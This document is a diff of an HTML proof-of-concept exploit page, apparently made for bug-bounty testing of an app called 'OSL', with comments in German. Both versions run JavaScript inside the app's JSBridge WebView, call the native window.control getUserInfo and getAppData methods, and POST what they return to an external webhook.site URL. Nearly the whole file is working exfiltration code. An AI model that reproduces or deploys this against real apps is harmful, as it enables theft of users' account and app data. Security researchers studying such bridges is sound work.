@@ -1,69 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OSL P1/P2 Full Exfiltration PoC</title>
+    <title>OSL P1 Exploitation</title>
 </head>
 <body>
-    <h1>OSL Deep Exfiltration Test</h1>
-    <div id="status">Scanne Bridge...</div>
-
+    <h1>OSL Sandbox Bypass Successful!</h1>
     <script>
         const WEBHOOK = 'https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d';
 
-        // Helfer-Funktion zum Senden an den Webhook
-        function sendLog(stage, data) {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ stage: stage, payload: data })
-            });
+        alert("P1 Triggered: Arbitrary JavaScript running inside JSBridgeWebview!");
+
+        // Expliziter Versuch, die nativen Daten abzugreifen
+        try {
+            if (window.control) {
+                // Da wir nun im richtigen Webview-Kontext landen, triggern wir die Datenexfiltration
+                // Test 1: Synchroner Abruf
+                let user = window.control.getUserInfo("poc");
+                let data = window.control.getAppData("poc");
+
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ type: "EXFILTRATION_SYNC", user: user, data: data })
+                });
+            } else {
+                fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "NO_BRIDGE_OBJECT" }) });
+            }
+        } catch(e) {
+            fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "JAVASCRIPT_ERROR", error: e.message }) });
         }
-
-        // 1. Definition aller gängigen Callback-Varianten global auf window
-        const callbackNames = ["handleUserInfo", "handleAppData", "callback", "onSuccess"];
-        callbackNames.forEach(name => {
-            window[name] = function(param1, param2) {
-                sendLog("CALLBACK_TRIGGERED_" + name, { arg1: param1, arg2: param2 });
-            };
-        });
-
-        // Falls die App ein spezifisches Objekt zurückgibt
-        window.onUserInfoReceived = function(data) { sendLog("CALLBACK_onUserInfoReceived", data); };
-        window.onAppDataReceived = function(data) { sendLog("CALLBACK_onAppDataReceived", data); };
-
-        setTimeout(function() {
-            if (!window.control) {
-                sendLog("ERROR", "Bridge window.control nicht gefunden");
-                return;
-            }
-
-            // Test 1: Versuche synchronen Rückgabewert abzugreifen (Falls void im Report falsch war)
-            try {
-                let syncUser = window.control.getUserInfo("test");
-                let syncApp = window.control.getAppData("test");
-                if (syncUser || syncApp) {
-                    sendLog("SYNCHRONOUS_DATA_FOUND", { userInfo: syncUser, appData: syncApp });
-                }
-            } catch(e) {
-                sendLog("ERROR_sync_attempt", e.message);
-            }
-
-            // Test 2: Versuche asynchrone Callbacks mit verschiedenen Namens-Formaten zu triggern
-            const formats = ["handleUserInfo", "window.handleUserInfo", "callback"];
-            formats.forEach(fmt => {
-                try { window.control.getUserInfo(fmt); } catch(e) {}
-                try { window.control.getAppData(fmt); } catch(e) {}
-            });
-
-            // Test 3: Falls die Methode ein leeres Argument oder JSON-String verlangt
-            try { window.control.getUserInfo(""); } catch(e) {}
-            try { window.control.getAppData(""); } catch(e) {}
-
-            // Letztes Lebenszeichen, dass alle Versuche abgefeuert wurden
-            sendLog("ALL_ATTEMPTS_FIRED", "Prüfe den Webhook auf CALLBACK oder SYNCHRONOUS Treffer!");
-
-        }, 1500);
     </script>
 </body>
 </html>
